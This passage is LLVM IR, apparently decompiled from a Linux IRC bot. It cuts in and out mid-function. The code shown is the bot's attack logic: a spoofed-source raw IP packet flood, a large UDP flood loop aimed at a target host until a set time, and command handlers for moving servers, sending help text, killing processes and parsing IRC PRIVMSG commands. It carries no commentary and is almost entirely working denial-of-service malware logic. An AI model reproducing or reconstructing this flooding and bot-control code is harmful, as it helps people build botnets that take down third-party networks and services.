  %v2_8049d0e = xor i32 %v1_8049d0e, %v1_8049d09
  store i32 %v2_8049d0e, i32* %stack_var_-204, align 4
  %v1_8049d13 = call i32 @srand(i32 %v2_8049d0e)
  %v0_8049d18 = call i32 @random()
  store i32 %v0_8049d18, i32* @edx, align 4
  %v2_8049d2a = ptrtoint i8* %stack_var_-100 to i32
  %v15_8049d2d = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v15_8049d2d, i32* %stack_var_-204, align 4
  %v4_8049d33 = bitcast i32* %stack_var_-60 to i8*
  %v5_8049d33 = call i32 @__GI_memset(i8* %v4_8049d33, i32 %v0_8049d18, i32 1400)
  %v1_8049d3b = add i32 %arg4, 4
  %v1_8049d3e = inttoptr i32 %v1_8049d3b to i32*
  %v2_8049d3e = load i32, i32* %v1_8049d3e, align 4
  store i32 %arg2, i32* %stack_var_-204, align 4
  %v3_8049d4a = call i32 @host2ip(i32 %arg2, i32 %v2_8049d3e)
  store i32 %arg1, i32* %stack_var_-204, align 4
  %v3_8049d73 = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_805acb4.76 to i32))
  %v3_8049ea2 = bitcast i8* %stack_var_-100 to i16*
  %v2_8049f05 = ptrtoint i32* %stack_var_-152 to i32
  %v2_8049f0b = ptrtoint i32* %stack_var_-140 to i32
  %v15_8049f11 = ptrtoint i32* %stack_var_-80 to i32
  %v2_8049f45 = ptrtoint i32* %stack_var_-120 to i32
  %v3_8049f5d = bitcast i32* %stack_var_-152 to i16*
  %v2_8049f69 = ptrtoint i32* %stack_var_-168 to i32
  %v5_8049fb6 = add i32 %v1_8049cc2, %v2_8049c70
  br label %dec_label_pc_8049d78

dec_label_pc_8049d78:                             ; preds = %dec_label_pc_8049fc4, %dec_label_pc_8049cfb
  %stack_var_-32.0 = phi i32 [ %tmp, %dec_label_pc_8049cfb ], [ %v4_8049fc4, %dec_label_pc_8049fc4 ]
  %v0_8049d78 = call i32 @getspoof()
  store i8 69, i8* %stack_var_-100, align 1
  store i32 1440, i32* %stack_var_-204, align 4
  %v2_8049da9 = call i32 @htons(i16 1440)
  %v1_8049db5 = call i32 @random()
  %v1_8049de1 = call i32 @random()
  %v1_8049de6 = urem i32 %v1_8049de1, 65536
  store i32 %v1_8049de6, i32* %stack_var_-80, align 4
  %v1_8049ded = call i32 @random()
  %v1_8049df9 = call i32 @random()
  %v1_8049e01 = call i32 @random()
  store i32 2, i32* %stack_var_-168, align 4
  store i32 %v2_8049d2a, i32* %stack_var_-204, align 4
  %v4_8049ea2 = call i32 @in_cksum(i16* %v3_8049ea2, i32 20)
  store i32 %v2_8049d2a, i32* %stack_var_-204, align 4
  %v4_8049ebc = call i32 @in_cksum(i16* %v3_8049ea2, i32 40)
  store i32 %v0_8049d78, i32* %stack_var_-152, align 4
  store i32 1420, i32* %stack_var_-204, align 4
  %v2_8049ef6 = call i32 @htons(i16 1420)
  store i32 %v15_8049f11, i32* %stack_var_-204, align 4
  %v4_8049f23 = call i32 @bcopy(i32 %v15_8049f11, i32 %v2_8049f0b, i32 20)
  store i32 %v15_8049d2d, i32* %stack_var_-204, align 4
  %v4_8049f45 = call i32 @bcopy(i32 %v15_8049d2d, i32 %v2_8049f45, i32 1400)
  store i32 %v2_8049f05, i32* %stack_var_-204, align 4
  %v4_8049f5d = call i32 @in_cksum(i16* %v3_8049f5d, i32 1432)
  store i32 %v4_8049ce1, i32* %stack_var_-204, align 4
  %v7_8049f9a = call i32 @sendto(i32 %v4_8049ce1, i32 %v2_8049d2a, i32 1440, i32 0, i32 %v2_8049f69, i32 16)
  %tmp57 = icmp ult i32 %stack_var_-32.0, 50
  br i1 %tmp57, label %dec_label_pc_8049fc4, label %dec_label_pc_8049fa5

dec_label_pc_8049fa5:                             ; preds = %dec_label_pc_8049d78
  store i32 0, i32* %stack_var_-204, align 4
  %v2_8049fac = call i32 @__GI_time(i32* null)
  %v7_8049fb9 = icmp ult i32 %v2_8049fac, %v5_8049fb6
  %v1_8049fbb = icmp eq i1 %v7_8049fb9, false
  br i1 %v1_8049fbb, label %dec_label_pc_8049fcc, label %dec_label_pc_8049fc4

dec_label_pc_8049fc4:                             ; preds = %dec_label_pc_8049fa5, %dec_label_pc_8049d78
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.0, %dec_label_pc_8049d78 ], [ 0, %dec_label_pc_8049fa5 ]
  %v4_8049fc4 = add i32 %stack_var_-32.1, 1
  br label %dec_label_pc_8049d78

dec_label_pc_8049fcc:                             ; preds = %dec_label_pc_8049fa5
  store i32 %v4_8049ce1, i32* %stack_var_-204, align 4
  %v1_8049fd2 = call i32 @close(i32 %v4_8049ce1)
  store i32 0, i32* %stack_var_-204, align 4
  %v1_8049fde = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8049fe3

dec_label_pc_8049fe3:                             ; preds = %entry, %dec_label_pc_8049fcc
  %v0_8049feb = phi i32 [ %v1_8049c7e, %entry ], [ %v1_8049fde, %dec_label_pc_8049fcc ]
  ret i32 %v0_8049feb

; uselistorder directives
  uselistorder i32 %stack_var_-32.0, { 1, 0 }
  uselistorder i32 %v15_8049f11, { 1, 0 }
  uselistorder i32 %v15_8049d2d, { 1, 0, 2 }
  uselistorder i32 %v4_8049ce1, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v4_8049c8b, { 1, 0 }
  uselistorder i32* %stack_var_-204, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i8* %stack_var_-100, { 2, 0, 1 }
  uselistorder i32* %stack_var_-152, { 1, 0, 2 }
  uselistorder i8 69, { 1, 2, 0 }
  uselistorder i32 ()* @getspoof, { 2, 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049fe3, { 1, 0 }
  uselistorder label %dec_label_pc_8049cfb, { 1, 0 }
  uselistorder label %dec_label_pc_8049cb7, { 1, 0 }
}

define i32 @unknown(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049fec = load i32, i32* @ebp, align 4
  store i32 %v0_8049fec, i32* %stack_var_-4, align 4
  %v4_8049fec = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8049fec, i32* @ebp, align 4
  store i32 1, i32* %stack_var_-32, align 4
  %v1_804a000 = call i32 @malloc(i32 9216)
  %v2_804a00f = call i32 @__GI_time(i32* null)
  %v1_804a01d = call i32 @mfork(i32 %arg2)
  %v1_804a022 = icmp eq i32 %v1_804a01d, 0
  %v1_804a024 = icmp eq i1 %v1_804a022, false
  br i1 %v1_804a024, label %dec_label_pc_804a19c, label %dec_label_pc_804a02a

dec_label_pc_804a02a:                             ; preds = %entry
  %v4_804a02a = add i32 %arg3, -1
  %v9_804a02a = sub i32 0, %arg3
  %v10_804a02a = and i32 %arg3, %v9_804a02a
  %v11_804a02a = icmp slt i32 %v10_804a02a, 0
  %v12_804a02a = icmp eq i32 %v4_804a02a, 0
  %v13_804a02a = icmp slt i32 %v4_804a02a, 0
  %v3_804a02e = icmp eq i1 %v13_804a02a, %v11_804a02a
  %v4_804a02e = icmp eq i1 %v12_804a02a, false
  %v5_804a02e = and i1 %v4_804a02e, %v3_804a02e
  br i1 %v5_804a02e, label %dec_label_pc_804a056, label %dec_label_pc_804a030

dec_label_pc_804a030:                             ; preds = %dec_label_pc_804a02a
  %v3_804a045 = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_805acd8.77 to i32))
  %v1_804a051 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804a056

dec_label_pc_804a056:                             ; preds = %dec_label_pc_804a02a, %dec_label_pc_804a030
  %v1_804a059 = add i32 %arg4, 8
  %v1_804a05c = inttoptr i32 %v1_804a059 to i32*
  %v2_804a05c = load i32, i32* %v1_804a05c, align 4
  %v1_804a061 = call i32 @atol(i32 %v2_804a05c)
  %v2_804a079 = ptrtoint i32* %stack_var_-48 to i32
  %v4_804a07f = bitcast i32* %stack_var_-48 to i8*
  %v5_804a07f = call i32 @__GI_memset(i8* %v4_804a07f, i32 0, i32 16)
  %v1_804a087 = add i32 %arg4, 4
  %v1_804a08a = inttoptr i32 %v1_804a087 to i32*
  %v2_804a08a = load i32, i32* %v1_804a08a, align 4
  %v3_804a096 = call i32 @host2ip(i32 %arg2, i32 %v2_804a08a)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_804a0c5 = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_805acfc.78 to i32))
  %v5_804a16f = add i32 %v1_804a061, %v2_804a00f
  %v2_804a102 = ptrtoint i32* %stack_var_-32 to i32
  br label %dec_label_pc_804a0ca

dec_label_pc_804a0ca:                             ; preds = %dec_label_pc_804a17d, %dec_label_pc_804a056
  %stack_var_-24.0 = phi i32 [ %tmp, %dec_label_pc_804a056 ], [ %v4_804a17d, %dec_label_pc_804a17d ]
  %v0_804a0ca = call i32 @random()
  %v4_804a0ed = call i32 @socket(i32 2, i32 2, i32 17)
  %v5_804a0f5 = icmp slt i32 %v4_804a0ed, 0
  br i1 %v5_804a0f5, label %dec_label_pc_804a158, label %dec_label_pc_804a0fb

dec_label_pc_804a0fb:                             ; preds = %dec_label_pc_804a0ca
  store i32 1, i32* %stack_var_-32, align 4
  %v4_804a117 = call i32 @ioctl(i32 %v4_804a0ed, i32 21537, i32 %v2_804a102)
  %v7_804a148 = call i32 @sendto(i32 %v4_804a0ed, i32 %v1_804a000, i32 9216, i32 0, i32 %v2_804a079, i32 16)
  %v1_804a153 = call i32 @close(i32 %v4_804a0ed)
  br label %dec_label_pc_804a158

dec_label_pc_804a158:                             ; preds = %dec_label_pc_804a0ca, %dec_label_pc_804a0fb
  %v7_804a15c = icmp sgt i32 %stack_var_-24.0, 49
  br i1 %v7_804a15c, label %dec_label_pc_804a15e, label %dec_label_pc_804a17d

dec_label_pc_804a15e:                             ; preds = %dec_label_pc_804a158
  %v2_804a165 = call i32 @__GI_time(i32* null)
  %v7_804a172 = icmp ult i32 %v2_804a165, %v5_804a16f
  %v1_804a174 = icmp eq i1 %v7_804a172, false
  br i1 %v1_804a174, label %dec_label_pc_804a185, label %dec_label_pc_804a17d

dec_label_pc_804a17d:                             ; preds = %dec_label_pc_804a15e, %dec_label_pc_804a158
  %stack_var_-24.1 = phi i32 [ %stack_var_-24.0, %dec_label_pc_804a158 ], [ 0, %dec_label_pc_804a15e ]
  %v4_804a17d = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_804a0ca

dec_label_pc_804a185:                             ; preds = %dec_label_pc_804a15e
  %v1_804a18b = call i32 @close(i32 %v4_804a0ed)
  %v1_804a197 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804a19c

dec_label_pc_804a19c:                             ; preds = %entry, %dec_label_pc_804a185
  %v0_804a19d = phi i32 [ %v1_804a01d, %entry ], [ %v1_804a197, %dec_label_pc_804a185 ]
  ret i32 %v0_804a19d

; uselistorder directives
  uselistorder i32 %v4_804a0ed, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v4_804a02a, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendto, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @host2ip, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @atol, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804a19c, { 1, 0 }
  uselistorder label %dec_label_pc_804a158, { 1, 0 }
  uselistorder label %dec_label_pc_804a056, { 1, 0 }
}

define i32 @move(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp10 = icmp slt i32 %arg3, 1
  %tmp11 = icmp eq i1 %tmp10, false
  br i1 %tmp11, label %dec_label_pc_804a1d0, label %dec_label_pc_804a1aa

dec_label_pc_804a1aa:                             ; preds = %entry
  %v3_804a1bf = call i32 @Send(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_805ad17.79 to i32))
  %v1_804a1cb = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804a1d0

dec_label_pc_804a1d0:                             ; preds = %entry, %dec_label_pc_804a1aa
  %v1_804a1d3 = add i32 %arg4, 4
  %v1_804a1d6 = inttoptr i32 %v1_804a1d3 to i32*
  %v2_804a1d6 = load i32, i32* %v1_804a1d6, align 4
  %v1_804a1db = inttoptr i32 %v2_804a1d6 to i8*
  %v2_804a1db = call i32 @__GI_strdup(i8* %v1_804a1db)
  store i32 %v2_804a1db, i32* @global_var_80679e0.80, align 32
  store i32 1, i32* @global_var_8062e20.81, align 32
  %v1_804a1f5 = call i32 @close(i32 %arg1)
  ret i32 %v1_804a1f5

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804a1d0, { 1, 0 }
}

define i32 @help(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804a1fc = load i32, i32* @ebp, align 4
  store i32 %v0_804a1fc, i32* %stack_var_-4, align 4
  %v4_804a1fc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804a1fc, i32* @ebp, align 4
  %v1_804a208 = call i32 @mfork(i32 %arg2)
  %v1_804a20d = icmp eq i32 %v1_804a208, 0
  %v1_804a20f = icmp eq i1 %v1_804a20d, false
  br i1 %v1_804a20f, label %dec_label_pc_804a49b, label %dec_label_pc_804a215

dec_label_pc_804a215:                             ; preds = %entry
  %v3_804a22a = call i32 @Send(i32 %arg1, i32 ptrtoint ([119 x i8]* @global_var_805ad34.82 to i32))
  %v1_804a236 = call i32 @sleep(i32 2)
  %v3_804a250 = call i32 @Send(i32 %arg1, i32 ptrtoint ([123 x i8]* @global_var_805adac.83 to i32))
  %v1_804a25c = call i32 @sleep(i32 2)
  %v3_804a276 = call i32 @Send(i32 %arg1, i32 ptrtoint ([77 x i8]* @global_var_805ae28.84 to i32))
  %v1_804a282 = call i32 @sleep(i32 2)
  %v3_804a29c = call i32 @Send(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_805ae78.85 to i32))
  %v1_804a2a8 = call i32 @sleep(i32 2)
  %v3_804a2c2 = call i32 @Send(i32 %arg1, i32 ptrtoint ([94 x i8]* @global_var_805aed8.86 to i32))
  %v1_804a2ce = call i32 @sleep(i32 2)
  %v3_804a2e8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([79 x i8]* @global_var_805af38.87 to i32))
  %v1_804a2f4 = call i32 @sleep(i32 2)
  %v3_804a30e = call i32 @Send(i32 %arg1, i32 ptrtoint ([89 x i8]* @global_var_805af88.88 to i32))
  %v1_804a31a = call i32 @sleep(i32 2)
  %v3_804a334 = call i32 @Send(i32 %arg1, i32 ptrtoint ([92 x i8]* @global_var_805afe4.89 to i32))
  %v1_804a340 = call i32 @sleep(i32 2)
  %v3_804a35a = call i32 @Send(i32 %arg1, i32 ptrtoint ([103 x i8]* @global_var_805b040.90 to i32))
  %v1_804a366 = call i32 @sleep(i32 2)
  %v3_804a380 = call i32 @Send(i32 %arg1, i32 ptrtoint ([102 x i8]* @global_var_805b0a8.91 to i32))
  %v1_804a38c = call i32 @sleep(i32 2)
  %v3_804a3a6 = call i32 @Send(i32 %arg1, i32 ptrtoint ([80 x i8]* @global_var_805b110.92 to i32))
  %v1_804a3b2 = call i32 @sleep(i32 2)
  %v3_804a3cc = call i32 @Send(i32 %arg1, i32 ptrtoint ([117 x i8]* @global_var_805b160.93 to i32))
  %v1_804a3d8 = call i32 @sleep(i32 2)
  %v3_804a3f2 = call i32 @Send(i32 %arg1, i32 ptrtoint ([90 x i8]* @global_var_805b1d8.94 to i32))
  %v1_804a3fe = call i32 @sleep(i32 2)
  %v3_804a418 = call i32 @Send(i32 %arg1, i32 ptrtoint ([91 x i8]* @global_var_805b234.95 to i32))
  %v1_804a424 = call i32 @sleep(i32 2)
  %v3_804a43e = call i32 @Send(i32 %arg1, i32 ptrtoint ([77 x i8]* @global_var_805b290.96 to i32))
  %v3_804a458 = call i32 @Send(i32 %arg1, i32 ptrtoint ([96 x i8]* @global_var_805b2e0.97 to i32))
  %v1_804a464 = call i32 @sleep(i32 2)
  %v3_804a47e = call i32 @Send(i32 %arg1, i32 ptrtoint ([82 x i8]* @global_var_805b340.98 to i32))
  %v1_804a48a = call i32 @sleep(i32 2)
  %v1_804a496 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804a49b

dec_label_pc_804a49b:                             ; preds = %entry, %dec_label_pc_804a215
  %v0_804a49c = phi i32 [ %v1_804a208, %entry ], [ %v1_804a496, %dec_label_pc_804a215 ]
  ret i32 %v0_804a49c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804a49b, { 1, 0 }
}

define i32 @killall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804a49d = load i32, i32* @ebp, align 4
  store i32 %v0_804a49d, i32* %stack_var_-4, align 4
  %v4_804a49d = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804a49d, i32* @ebp, align 4
  %v4_804a4e1 = icmp eq i32 %arg2, 0
  %v0_804a53c12 = load i32, i32* @global_var_8062e30.30, align 16
  %v10_804a54114 = icmp eq i32 %v0_804a53c12, 0
  br i1 %v10_804a54114, label %dec_label_pc_804a54a, label %dec_label_pc_804a4b0

dec_label_pc_804a4b0:                             ; preds = %entry, %dec_label_pc_804a539
  %storemerge19 = phi i32 [ %v4_804a539, %dec_label_pc_804a539 ], [ 0, %entry ]
  %v2_804a4b3 = mul i32 %storemerge19, 4
  %v0_804a4b8 = load i32, i32* @global_var_80679ec.31, align 4
  %v2_804a4bd = add i32 %v0_804a4b8, %v2_804a4b3
  %v1_804a4c0 = inttoptr i32 %v2_804a4bd to i32*
  %v2_804a4c0 = load i32, i32* %v1_804a4c0, align 4
  %v1_804a4c2 = icmp eq i32 %v2_804a4c0, 0
  br i1 %v1_804a4c2, label %dec_label_pc_804a539, label %dec_label_pc_804a4c6

dec_label_pc_804a4c6:                             ; preds = %dec_label_pc_804a4b0
  %v2_804a4d6 = load i32, i32* %v1_804a4c0, align 4
  store i32 %v2_804a4d6, i32* @ebx, align 4
  %v1_804a4d8 = call i32 @__libc_getpid(i32 %storemerge19)
  %v0_804a4dd = load i32, i32* @ebx, align 4
  %v12_804a4dd = icmp eq i32 %v0_804a4dd, %v1_804a4d8
  br i1 %v12_804a4dd, label %dec_label_pc_804a539, label %dec_label_pc_804a4e1

dec_label_pc_804a4e1:                             ; preds = %dec_label_pc_804a4c6
  br i1 %v4_804a4e1, label %dec_label_pc_804a517, label %dec_label_pc_804a4e7

dec_label_pc_804a4e7:                             ; preds = %dec_label_pc_804a4e1
  %v3_804a512 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_805b392.99 to i32))
  br label %dec_label_pc_804a517

dec_label_pc_804a517:                             ; preds = %dec_label_pc_804a4e1, %dec_label_pc_804a4e7
  %v0_804a51f = load i32, i32* @global_var_80679ec.31, align 4
  %v2_804a524 = add i32 %v0_804a51f, %v2_804a4b3
  %v1_804a527 = inttoptr i32 %v2_804a524 to i32*
  %v2_804a527 = load i32, i32* %v1_804a527, align 4
  %v3_804a534 = call i32 @kill(i32 %v2_804a527, i32 9)
  br label %dec_label_pc_804a539

dec_label_pc_804a539:                             ; preds = %dec_label_pc_804a4c6, %dec_label_pc_804a4b0, %dec_label_pc_804a517
  %v4_804a539 = add i32 %storemerge19, 1
  %v0_804a53c = load i32, i32* @global_var_8062e30.30, align 16
  %v10_804a541 = icmp ult i32 %v4_804a539, %v0_804a53c
  br i1 %v10_804a541, label %dec_label_pc_804a4b0, label %dec_label_pc_804a53c.dec_label_pc_804a54a_crit_edge

dec_label_pc_804a53c.dec_label_pc_804a54a_crit_edge: ; preds = %dec_label_pc_804a539
  br label %dec_label_pc_804a54a

dec_label_pc_804a54a:                             ; preds = %entry, %dec_label_pc_804a53c.dec_label_pc_804a54a_crit_edge
  %v0_804a53c.lcssa = phi i32 [ %v0_804a53c, %dec_label_pc_804a53c.dec_label_pc_804a54a_crit_edge ], [ 0, %entry ]
  ret i32 %v0_804a53c.lcssa

; uselistorder directives
  uselistorder i32 %v4_804a539, { 1, 0 }
  uselistorder i32 %v2_804a4b3, { 1, 0 }
  uselistorder i32 %storemerge19, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_804a54a, { 1, 0 }
  uselistorder label %dec_label_pc_804a539, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a517, { 1, 0 }
  uselistorder label %dec_label_pc_804a4b0, { 1, 0 }
}

define i32 @killd(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804a550 = load i32, i32* @ebp, align 4
  store i32 %v0_804a550, i32* %stack_var_-4, align 4
  %v4_804a550 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804a550, i32* @ebp, align 4
  %v3_804a564 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_805a6ef.29 to i32))
  ret i32 %v3_804a564

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @_PRIVMSG(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %tmp68 = inttoptr i32 %arg3 to i8*
  %stack_var_-2136 = alloca i32, align 4
  %stack_var_-1112 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804a570 = load i32, i32* @ebx, align 4
  store i32 %v0_804a570, i32* %stack_var_-16, align 4
  %v5_804a571 = icmp ult i32* %stack_var_-16, inttoptr (i32 2204 to i32*)
  store i1 %v5_804a571, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804a583

dec_label_pc_804a580:                             ; preds = %dec_label_pc_804a5a8
  %v4_804a580 = add i32 %storemerge11, 1
  br label %dec_label_pc_804a583

dec_label_pc_804a583:                             ; preds = %entry, %dec_label_pc_804a580
  %storemerge11 = phi i32 [ %v4_804a580, %dec_label_pc_804a580 ], [ 0, %entry ]
  store i32 %storemerge11, i32* %edx.global-to-local, align 4
  %v3_804a59d = call i32 @_strlen(i8* %tmp68)
  %v7_804a5a4 = icmp ult i32 %storemerge11, %v3_804a59d
  store i1 %v7_804a5a4, i1* %cf.global-to-local, align 1
  %v1_804a5a6 = icmp eq i1 %v7_804a5a4, false
  %.pre = add i32 %storemerge11, %arg3
  br i1 %v1_804a5a6, label %dec_label_pc_804a583.dec_label_pc_804a5b5_crit_edge, label %dec_label_pc_804a5a8

dec_label_pc_804a583.dec_label_pc_804a5b5_crit_edge: ; preds = %dec_label_pc_804a583
  %.pre20 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_804a5b5

dec_label_pc_804a5a8:                             ; preds = %dec_label_pc_804a583
  %v11_804a5ab = icmp ult i32 %.pre, %storemerge11
  store i1 %v11_804a5ab, i1* %cf.global-to-local, align 1
  %v1_804a5ae = inttoptr i32 %.pre to i8*
  %v2_804a5ae = load i8, i8* %v1_804a5ae, align 1
  %v3_804a5b1 = icmp ult i8 %v2_804a5ae, 32
  store i1 %v3_804a5b1, i1* %cf.global-to-local, align 1
  %v7_804a5b1 = icmp eq i8 %v2_804a5ae, 32
  %v1_804a5b3 = icmp eq i1 %v7_804a5b1, false
  br i1 %v1_804a5b3, label %dec_label_pc_804a580, label %dec_label_pc_804a5b5

dec_label_pc_804a5b5:                             ; preds = %dec_label_pc_804a5a8, %dec_label_pc_804a583.dec_label_pc_804a5b5_crit_edge
  %v1_804a5bb.pre-phi = phi i8* [ %.pre20, %dec_label_pc_804a583.dec_label_pc_804a5b5_crit_edge ], [ %v1_804a5ae, %dec_label_pc_804a5a8 ]
  store i8 0, i8* %v1_804a5bb.pre-phi, align 1
  %v1_804a5ca = add i32 %.pre, 2
  %v5_804a5ca = icmp ugt i32 %.pre, -3
  store i1 %v5_804a5ca, i1* %cf.global-to-local, align 1
  %v5_804a5cd = inttoptr i32 %v1_804a5ca to i8*
  %v4_804a5df = ptrtoint i8* %arg2 to i32
  br label %dec_label_pc_804a5dc

dec_label_pc_804a5d9:                             ; preds = %dec_label_pc_804a601
  %v4_804a5d9 = add i32 %storemerge10, 1
  br label %dec_label_pc_804a5dc

dec_label_pc_804a5dc:                             ; preds = %dec_label_pc_804a5b5, %dec_label_pc_804a5d9
  %storemerge10 = phi i32 [ %v4_804a5d9, %dec_label_pc_804a5d9 ], [ 0, %dec_label_pc_804a5b5 ]
  store i32 %storemerge10, i32* %edx.global-to-local, align 4
  store i32 %v4_804a5df, i32* @edi, align 4
  %v3_804a5f6 = call i32 @_strlen(i8* %arg2)
  %v7_804a5fd = icmp ult i32 %storemerge10, %v3_804a5f6
  store i1 %v7_804a5fd, i1* %cf.global-to-local, align 1
  %v1_804a5ff = icmp eq i1 %v7_804a5fd, false
  %.pre21 = add i32 %storemerge10, %v4_804a5df
  br i1 %v1_804a5ff, label %dec_label_pc_804a5dc.dec_label_pc_804a60e_crit_edge, label %dec_label_pc_804a601

dec_label_pc_804a5dc.dec_label_pc_804a60e_crit_edge: ; preds = %dec_label_pc_804a5dc
  %.pre28 = inttoptr i32 %.pre21 to i8*
  br label %dec_label_pc_804a60e

dec_label_pc_804a601:                             ; preds = %dec_label_pc_804a5dc
  %v11_804a604 = icmp ult i32 %.pre21, %storemerge10
  store i1 %v11_804a604, i1* %cf.global-to-local, align 1
  %v1_804a607 = inttoptr i32 %.pre21 to i8*
  %v2_804a607 = load i8, i8* %v1_804a607, align 1
  %v6_804a60a = icmp ult i8 %v2_804a607, 33
  store i1 %v6_804a60a, i1* %cf.global-to-local, align 1
  %v10_804a60a = icmp eq i8 %v2_804a607, 33
  %v1_804a60c = icmp eq i1 %v10_804a60a, false
  br i1 %v1_804a60c, label %dec_label_pc_804a5d9, label %dec_label_pc_804a60e

dec_label_pc_804a60e:                             ; preds = %dec_label_pc_804a601, %dec_label_pc_804a5dc.dec_label_pc_804a60e_crit_edge
  %v1_804a614.pre-phi = phi i8* [ %.pre28, %dec_label_pc_804a5dc.dec_label_pc_804a60e_crit_edge ], [ %v1_804a607, %dec_label_pc_804a601 ]
  %v11_804a611 = icmp ult i32 %.pre21, %storemerge10
  store i1 %v11_804a611, i1* %cf.global-to-local, align 1
  store i8 0, i8* %v1_804a614.pre-phi, align 1
  %v2_804a61a = load i8, i8* %v5_804a5cd, align 1
  %v3_804a61a = zext i8 %v2_804a61a to i32
  %v6_804a61d = icmp ult i8 %v2_804a61a, 33
  store i1 %v6_804a61d, i1* %cf.global-to-local, align 1
  %v10_804a61d = icmp eq i8 %v2_804a61a, 33
  %v1_804a61f = icmp eq i1 %v10_804a61d, false
  br i1 %v1_804a61f, label %dec_label_pc_804aa9f, label %dec_label_pc_804a625

dec_label_pc_804a625:                             ; preds = %dec_label_pc_804a60e
  %v0_804a625 = load i32, i32* @global_var_80679e8.100, align 8
  %v4_804a634 = call i32 @__GI_strcasecmp(i8* %tmp68, i32 %v0_804a625)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804a639 = icmp eq i32 %v4_804a634, 0
  %v1_804a63b = icmp eq i1 %v1_804a639, false
  br i1 %v1_804a63b, label %dec_label_pc_804aa9f, label %dec_label_pc_804a641

dec_label_pc_804a641:                             ; preds = %dec_label_pc_804a625
  %v2_804a641 = ptrtoint i32* %stack_var_-1112 to i32
  store i32 %v2_804a641, i32* %edx.global-to-local, align 4
  %v5_804a65b = bitcast i32* %stack_var_-1112 to i8*
  %v6_804a65b = call i32 @__GI_memset(i8* %v5_804a65b, i32 0, i32 1024)
  %v5_804a667 = add i32 %.pre, 3
  %v22_804a667 = inttoptr i32 %v5_804a667 to i8*
  br label %dec_label_pc_804a676

dec_label_pc_804a673:                             ; preds = %dec_label_pc_804a69b
  %v4_804a673 = add i32 %storemerge9, 1
  br label %dec_label_pc_804a676

dec_label_pc_804a676:                             ; preds = %dec_label_pc_804a641, %dec_label_pc_804a673
  %storemerge9 = phi i32 [ %v4_804a673, %dec_label_pc_804a673 ], [ 0, %dec_label_pc_804a641 ]
  store i32 %storemerge9, i32* @edx, align 4
  %v3_804a690 = call i32 @_strlen(i8* %v22_804a667)
  %v0_804a697 = load i32, i32* @edx, align 4
  %v7_804a697 = icmp ult i32 %v0_804a697, %v3_804a690
  store i1 %v7_804a697, i1* %cf.global-to-local, align 1
  %v1_804a699 = icmp eq i1 %v7_804a697, false
  %.pre29 = add i32 %storemerge9, %v5_804a667
  br i1 %v1_804a699, label %dec_label_pc_804a676.dec_label_pc_804a6a8_crit_edge, label %dec_label_pc_804a69b

